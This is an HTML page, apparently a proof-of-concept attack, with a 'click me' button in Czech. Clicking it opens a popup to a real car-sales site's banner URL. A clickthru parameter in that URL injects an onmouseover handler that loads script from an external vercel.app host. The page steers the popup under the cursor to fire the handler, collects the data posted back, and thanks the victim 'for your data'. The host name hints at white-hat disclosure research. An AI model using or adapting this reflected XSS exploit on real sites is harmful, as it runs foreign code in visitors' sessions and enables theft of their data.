<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        body {
            margin: 0;
        }
        button {
            position: absolute;
            left: 50%;
            top: 50%;
            transform: translate(-50%, -50%);
            color: #ffffff;
            background-color: #000000;
            font-size: 16px;
            border-radius: 8px;
            padding: 24px 32px;
            cursor: pointer
        }
        button:hover {
            color: #ffffff;
            background-color: #383838;
        }
    </style>
</head>
<body>
<button autofocus>Klikni na mě</button>
<pre></pre>
<script>
    const externalURL = 'https://www.sauto.cz/bannerova-reklama?perPage=4&banner=1&clickthru=/%22onmouseover=%22let%20s%20=%20document.createElement(%27script%27);%20s.setAttribute(%27src%27,%27https://whitehat-email-cz.vercel.app/index.js%27);%20document.head.appendChild(s)';
    let popupEl = null;
    window.addEventListener(
        "message",
        (event) => {
            document.body.querySelector('pre').innerHTML += JSON.stringify(event.data, null, 4) + "\n";
        },
        false,
    );

    document.addEventListener('click', (e) => {
        document.body.querySelector('button').innerHTML = 'Děkuju za tvoje data ! :-)'
        popup(e.x, e.y);
    });

    document.addEventListener('mousemove', (e) => {
        // console.log(e);
        if (popupEl) {
            console.log('postMessage');
            popupEl.postMessage(
                {
                    messageType: 'move',
                    data: {
                        x: e.x - 150,
                        y: e.y,
                    }
                },
                externalURL,
            )
            // popupEl.moveTo(e.x - 150, e.y - 300);
        }
    })

    function popup(x, y) {
        const left = x - 150;
        const top = y - 300;
        popupEl = window.open(
            externalURL,
            '_blank',
            "height=600, width=300, resizable=0, scrollbars=0, status=0, titlebar=0, toolbar=0, location=0, menubar=0, left=" + left + ", top=" + top
        );
    }
</script>
</body>
</html>